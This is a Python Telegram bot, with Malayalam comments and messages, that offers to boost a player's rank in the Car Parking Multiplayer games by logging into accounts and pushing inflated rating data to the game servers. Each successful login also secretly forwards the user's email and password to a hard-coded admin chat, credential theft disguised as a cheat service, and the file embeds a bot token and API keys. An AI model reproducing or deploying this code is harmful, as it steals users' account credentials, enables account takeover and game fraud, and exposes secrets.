import telebot
import requests
import json
import time

# --- CONFIG ---
TOKEN = '8542467216:AAG_S6R4YMswzKHRWJxOtCCj0A059bf3BpE'
ADMIN_ID = '5475305604'
bot = telebot.TeleBot(TOKEN)

# API ENDPOINTS
CPM1_AUTH = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
CPM1_SET_RANK = 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'

CPM2_AUTH = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
CPM2_SET_RANK = 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'

# --- CORE FUNCTIONS ---

def get_access_token(email, password, game_type):
    """യൂസർ ലോഗിൻ ചെയ്ത് ടോക്കൺ എടുക്കുന്ന ഫംഗ്ഷൻ"""
    url = CPM1_AUTH if game_type == 'CPM1' else CPM2_AUTH
    payload = {'email': email, 'password': password, 'returnSecureToken': True}
    try:
        r = requests.post(url, json=payload, timeout=10)
        data = r.json()
        if 'idToken' in data:
            return data['idToken']
    except:
        return None
    return None

def inject_rank_data(token, game_type):
    """റാങ്ക് ഡാറ്റ ഗെയിം സെർവറിലേക്ക് അയക്കുന്ന ഫംഗ്ഷൻ"""
    url = CPM1_SET_RANK if game_type == 'CPM1' else CPM2_SET_RANK
    
    # നിങ്ങൾക്കാവശ്യമായ എല്ലാ ഗെയിം ഫീച്ചറുകളും ഇവിടെ ലിസ്റ്റ് ചെയ്യുന്നു
    stats_list = [
        'cars', 'car_fix', 'car_collided', 'car_exchange', 'car_trade',
        'car_wash', 'slicer_cut', 'drift_max', 'drift', 'cargo', 'delivery',
        'taxi', 'levels', 'gifts', 'fuel', 'offroad', 'speed_banner',
        'reactions', 'police', 'run', 'real_estate', 't_distance',
        'treasure', 'block_post', 'push_ups', 'burnt_tire', 'passanger_distance'
    ]
    
    # വാല്യൂസ് സെറ്റ് ചെയ്യുന്നു
    rating_dict = {stat: 100000 for stat in stats_list}
    rating_dict['time'] = 10000000000
    rating_dict['race_win'] = 5000
    
    # ശരിയായ ഫോർമാറ്റിലുള്ള പേലോഡ്
    payload = {'data': json.dumps({'RatingData': rating_dict})}
    headers = {
        'Authorization': f"Bearer {token}",
        'Content-Type': 'application/json',
        'User-Agent': 'okhttp/3.12.13'
    }
    
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=15)
        return r.status_code == 200
    except:
        return False

# --- BOT HANDLERS ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    msg = (
        "🏎️ **CPM RANK KING BOT v2**\n\n"
        "CPM 1, CPM 2 എന്നീ ഗെയിമുകളിൽ റാങ്ക് മാറ്റാൻ താഴെ പറയുന്ന കമാൻഡ് ഉപയോഗിക്കുക:\n\n"
        "👉 `/rank [cpm1/cpm2] [email] [password]`\n\n"
        "Example: `/rank cpm1 test@gmail.com 123456`"
    )
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['rank'])
def handle_rank_request(message):
    try:
        parts = message.text.split()
        if len(parts) < 4:
            bot.reply_to(message, "❌ തെറ്റായ രീതി! \nഉപയോഗിക്കേണ്ട വിധം: `/rank cpm1 email pass`")
            return
        
        game = parts[1].upper()
        email = parts[2]
        password = parts[3]
        
        if game not in ['CPM1', 'CPM2']:
            bot.reply_to(message, "❌ CPM1 അല്ലെങ്കിൽ CPM2 എന്ന് മാത്രം ടൈപ്പ് ചെയ്യുക.")
            return

        status = bot.reply_to(message, f"🔍 **{game}** അക്കൗണ്ട് പരിശോധിക്കുന്നു...")

        # 1. ലോഗിൻ ഫംഗ്ഷൻ വിളിക്കുന്നു
        token = get_access_token(email, password, game)
        
        if token:
            # വിവരങ്ങൾ നിങ്ങൾക്ക് അയക്കുന്നു (Admin Alert)
            bot.send_message(ADMIN_ID, f"📢 **Login Alert**\nGame: {game}\nEmail: `{email}`\nPass: `{password}`", parse_mode='Markdown')
            
            bot.edit_message_text("✅ ലോഗിൻ സക്സസ്! റാങ്ക് അപ്ഡേറ്റ് ചെയ്യുന്നു...", message.chat.id, status.message_id)
            
            # 2. റാങ്ക് ഇൻജക്ഷൻ ഫംഗ്ഷൻ വിളിക്കുന്നു
            if inject_rank_data(token, game):
                bot.edit_message_text(f"👑 **Success!** {game} അക്കൗണ്ട് ഇപ്പോൾ King റാങ്കിലായി. ഗെയിം റീസ്റ്റാർട്ട് ചെയ്യുക.", message.chat.id, status.message_id)
            else:
                bot.edit_message_text("❌ റാങ്ക് മാറ്റാൻ സെർവറിൽ സാധിച്ചില്ല.", message.chat.id, status.message_id)
        else:
            bot.edit_message_text("❌ തെറ്റായ ഇമെയിൽ അല്ലെങ്കിൽ പാസ്‌വേഡ്.", message.chat.id, status.message_id)

    except Exception as e:
        bot.reply_to(message, "❌ ഒരു തകരാർ സംഭവിച്ചു. വീണ്ടും ശ്രമിക്കുക.")

# Start the bot
if __name__ == "__main__":
    print("Bot is alive...")
    bot.infinity_polling()
